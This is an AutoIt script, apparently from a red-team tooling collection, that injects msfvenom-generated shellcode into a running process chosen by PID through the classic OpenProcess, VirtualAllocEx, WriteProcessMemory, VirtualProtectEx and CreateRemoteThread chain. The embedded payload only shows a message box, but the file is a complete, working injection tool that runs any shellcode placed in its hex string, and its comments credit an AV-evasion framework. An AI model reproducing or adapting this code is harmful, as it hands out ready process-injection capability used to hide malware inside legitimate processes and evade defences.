#NoTrayIcon
#Region
#AutoIt3Wrapper_Compile_Both=y
#AutoIt3Wrapper_UseX64=y
#AutoIt3Wrapper_Change2CUI=y
#EndRegion

#include <Process.au3>
#include <Memory.au3>
#include <WinAPI.au3>

#cs --------------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         VIVI (https://github.com/V1V1) | (https://twitter.com/_theVIVI)

 Script Function:
	Injects shellcode into a remote process using the CreateRemoteThread WinAPI.

#ce --------------------------------------------------------------------------------

; Title
ConsoleWrite(@CRLF & "=========== CreateRemoteThread Process Injection ===========" & @CRLF & @CRLF)

; Hex shellcode
; msfvenom -p windows/x64/messagebox EXITFUNC=thread TITLE="What is my purpose?" TEXT="You pass butter." -f hex
Global $hexShellcode = "fc4881e4f0ffffffe8d0000000415141505251564831d265488b52603e488b52183e488b52203e488b72503e480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed5241513e488b52203e8b423c4801d03e8b80880000004885c0746f4801d0503e8b48183e448b40204901d0e35c48ffc93e418b34884801d64d31c94831c0ac41c1c90d4101c138e075f13e4c034c24084539d175d6583e448b40244901d0663e418b0c483e448b401c4901d03e418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a3e488b12e949ffffff5d49c7c1000000003e488d951a0100003e4c8d852b0100004831c941ba45835607ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5596f752070617373206275747465722e0057686174206973206d7920707572706f73653f00"

;~ Commandline arguments check
_CheckArguments()

; Check if process is running
_CheckProcess()

; CreateRemoteThread process injection
_ProcessInjection()

#cs ----------------------------------------------------------------------------

Main functions:
    _CheckArguments()
    _CheckProcess()
    _ProcessInjection()

#ce ----------------------------------------------------------------------------

Func _CheckArguments()

    If $CmdLine[0] <= 0 Then
        ConsoleWrite("[X] You must provide a process ID" & @CRLF & @CRLF)
        ConsoleWrite("[i] CreateRemoteThread.exe pid" & @CRLF & @CRLF)
        Exit

    ElseIf $CmdLine[0] > 1 Then
        ConsoleWrite("[X] Too many arguments provided." & @CRLF & @CRLF)
        ConsoleWrite("[i] CreateRemoteThread.exe pid" & @CRLF & @CRLF)
        Exit

    EndIf

EndFunc ;==>_CheckArguments

Func _CheckProcess()

    ; Process check
    ConsoleWrite("----- Process Check -----" & @CRLF & @CRLF)
    ConsoleWrite("[*] Checking for target process" & @CRLF & @CRLF)

    Global $targetPID = ProcessExists($CmdLine[1])

    If Not $targetPID = 0 Then
        Global $targetProcName = _ProcessGetName($targetPID)
        ConsoleWrite("[i] Target process is running (" & $targetProcName &")" & @CRLF & @CRLF)

    ElseIf $targetPID = 0 Then
        ConsoleWrite("[X] Target process is not running. Exiting." & @CRLF & @CRLF)
        Exit

    EndIf

EndFunc ;==>_CheckProcess

Func _ProcessInjection()

    ; Process injection
    ConsoleWrite("----- Process injection -----" & @CRLF & @CRLF)

    ; Adapted from - https://github.com/Veil-Framework/Veil/blob/master/tools/evasion/payloads/autoit/shellcode_inject/flat.py
    ; Credits - ChrisTruncer (https://github.com/ChrisTruncer)
    Local $autoItshellcode = "0x" & $hexShellcode
    Local $shellcodeBuffer = DllStructCreate("byte[" & BinaryLen($autoItshellcode) & "]")
    DllStructSetData($shellcodeBuffer, 1, $autoItshellcode)

    ConsoleWrite("[i] Shellcode size: " & sizeof($shellcodeBuffer) & " bytes" & @CRLF & @CRLF)
    ConsoleWrite("[*] Injecting shellcode into PID:" & $targetPID & " (" & $targetProcName &")" & @CRLF & @CRLF)

    ; OpenProcess
    $hProcess = _WinAPI_OpenProcess( _
        $PROCESS_ALL_ACCESS, _
        0, _
        $targetPID, _
        True)

    ; VirtualAllocEx
    $hRegion = _MemVirtualAllocEx( _
        $hProcess, _
        0, _
        sizeof($shellcodeBuffer), _
        $MEM_COMMIT + $MEM_RESERVE, _
        $PAGE_READWRITE)

    ; WriteProcessMemory
    Local $written

    _WinAPI_WriteProcessMemory ( _
        $hProcess, _
        $hRegion, _
        _ptr($shellcodeBuffer), _
        sizeof($shellcodeBuffer), _
        $written)

    ; VirtualProtectEx
    $protectCall = DllCall("kernel32.dll", "int", "VirtualProtectEx", _
        "hwnd", $hProcess, _
        "ptr", $hRegion, _
        "ulong_ptr", sizeof($shellcodeBuffer), _
        "uint", 0x20, _ ;PAGE_EXECUTE_READ
        "uint*", 0)

    $hProtect = $protectCall[0]

    ; CreateRemoteThread
    $threadCall = DllCall("Kernel32.dll", "int", "CreateRemoteThread", _
        "ptr", $hProcess, _
        "ptr", 0, _
        "int", 0, _
        "ptr", $hRegion, _
        "ptr", 0, _
        "int", 0, _
        "dword*", 0)

    $hThread = $threadCall[0]

EndFunc ;==>_ProcessInjection

#cs ----------------------------------------------------------------------------

Util functions:
    _ptr
    sizeof

#ce ----------------------------------------------------------------------------

; Adapted from - https://www.autoitscript.com/forum/topic/95419-injecting-and-executing-code-in-external-process/
; Credits - monoceres (https://www.autoitscript.com/forum/profile/23930-monoceres/)
Func _ptr($s, $e = "")
	If $e <> "" Then Return DllStructGetPtr($s, $e)
	Return DllStructGetPtr($s)
EndFunc   ;==>_ptr

Func sizeof($s)
	Return DllStructGetSize($s)
EndFunc   ;==>sizeof
